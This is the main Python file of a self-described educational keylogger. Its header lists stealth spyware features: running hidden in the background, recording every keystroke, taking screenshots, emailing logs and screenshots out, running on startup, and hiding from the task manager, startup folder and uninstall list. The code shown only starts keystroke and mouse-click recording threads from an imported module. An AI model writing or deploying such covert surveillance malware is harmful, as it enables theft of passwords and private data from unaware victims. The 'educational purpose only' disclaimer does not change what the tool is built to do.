#!/usr/bin/env python

# Author: Muhammad Ahmad
# Email : muhammadahmadkon@gmail.com
# Date : 06 - Oct - 2023
# About: This file is main file of the Keylogger
# Disclaimer: This code is for educational purpose only. Me or the contributors are not responsible for any damage caused by this code. Use at your own risk.
# Why I made this: I made this for my educational project. I am try to excel my cyber security skills. So, that's why I made this.

# Features:
# 1. It will run in background.
# 2. It will send email to the user with the log file.
# 3. It will take screenshot of the user screen.
# 4. It will send the screenshot to the user.
# 5. It will record each and every keystroke of the user.
# 6. Use of threading to run multiple functions at the same time.
# 7. It will run on startup.
# 8. It will hide itself from the task manager.
# 9. It will hide itself from the startup folder.
# 10. It will hide itself from the uninstall list.

# ====================================================

# ========== Importing Modules ==========
import threading
from utils.keyTrack import recordKeyStrokes, recordMouseClicks

# ========== Main Function ==========
def main():
    # Creating threads
    keyTrackThread = threading.Thread(target=recordKeyStrokes)
    mouseTrackThread = threading.Thread(target=recordMouseClicks)
    
    # Starting threads
    keyTrackThread.start()
    mouseTrackThread.start()

# ========== Main Function Call ==========
if __name__ == "__main__":
    main()